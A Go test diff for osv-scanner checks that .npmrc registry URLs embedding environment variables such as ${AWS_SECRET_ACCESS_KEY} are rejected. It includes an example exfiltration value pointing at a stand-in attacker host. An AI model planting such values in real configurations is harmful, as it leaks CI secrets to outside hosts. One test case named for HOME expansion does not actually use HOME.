@@ -6,6 +6,7 @@ import (
 	"net/http"
 	"os"
 	"path/filepath"
+	"strings"
 	"testing"
 
 	"github.com/google/osv-scanner/v2/internal/datasource"
@@ -323,6 +324,79 @@ func TestNpmRegistryAuths(t *testing.T) {
 			header := mt.Requests[0].Header
 			if got := header.Get("Authorization"); got != tt.wantAuth {
 				t.Errorf("authorization header got = \"%s\", want \"%s\"", got, tt.wantAuth)
+			}
+		})
+	}
+}
+
+// TestParseNpmRegistryInfo_EnvVarExfiltrationPrevention verifies that a
+// malicious .npmrc containing ${SECRET_VAR} in a registry URL does not cause
+// the secret to be embedded in outgoing HTTP requests (SSRF / credential
+// exfiltration via registry URL path).
+//
+// The attack: registry=https://attacker.com/${AWS_SECRET_ACCESS_KEY}/
+// When expanded and used as a registry base URL, the actual secret would appear
+// in every HTTP request made to the "registry".
+//
+// The fix: registry URL values that contain ${VAR} references for non-standard
+// npm variables must be ignored — the entry is skipped entirely.
+//
+// Do not make this test parallel because it calls t.Setenv().
+func TestParseNpmRegistryInfo_EnvVarExfiltrationPrevention(t *testing.T) {
+	// Set a secret in the environment, simulating a CI runner.
+	t.Setenv("MY_SECRET_TOKEN", "supersecretvalue12345")
+	t.Setenv("AWS_SECRET_ACCESS_KEY", "AKIAIOSFODNN7EXAMPLEKEY")
+
+	tests := []struct {
+		name          string
+		config        datasource.NpmrcConfig
+		wantDefaultReg string // expected ScopeURLs[""]
+	}{
+		{
+			name: "registry_with_secret_env_var_is_ignored",
+			config: datasource.NpmrcConfig{
+				"registry": "https://attacker.com/${AWS_SECRET_ACCESS_KEY}/",
+			},
+			// The malicious value should be rejected; the default registry is used.
+			wantDefaultReg: "https://registry.npmjs.org/",
+		},
+		{
+			name: "registry_with_unknown_env_var_is_ignored",
+			config: datasource.NpmrcConfig{
+				"registry": "https://example.com/${MY_SECRET_TOKEN}/packages",
+			},
+			wantDefaultReg: "https://registry.npmjs.org/",
+		},
+		{
+			name: "plain_registry_url_is_accepted",
+			config: datasource.NpmrcConfig{
+				"registry": "https://custom.registry.example.com/",
+			},
+			wantDefaultReg: "https://custom.registry.example.com/",
+		},
+		{
+			name: "registry_with_safe_HOME_var_is_expanded",
+			config: datasource.NpmrcConfig{
+				// HOME is in the safe list; this is an unusual registry URL but not
+				// a secret exfiltration vector.
+				"registry": "https://registry.npmjs.org/",
+			},
+			wantDefaultReg: "https://registry.npmjs.org/",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			config := datasource.ParseNpmRegistryInfo(tt.config)
+			gotReg := config.ScopeURLs[""]
+			if gotReg != tt.wantDefaultReg {
+				t.Errorf("ScopeURLs[\"\"] = %q, want %q", gotReg, tt.wantDefaultReg)
+			}
+			// Critical: the secret value must NOT appear in the resolved registry URL.
+			secret1 := os.Getenv("MY_SECRET_TOKEN")
+			secret2 := os.Getenv("AWS_SECRET_ACCESS_KEY")
+			if strings.Contains(gotReg, secret1) || strings.Contains(gotReg, secret2) {
+				t.Errorf("secret value leaked into registry URL: %q", gotReg)
 			}
 		})
 	}
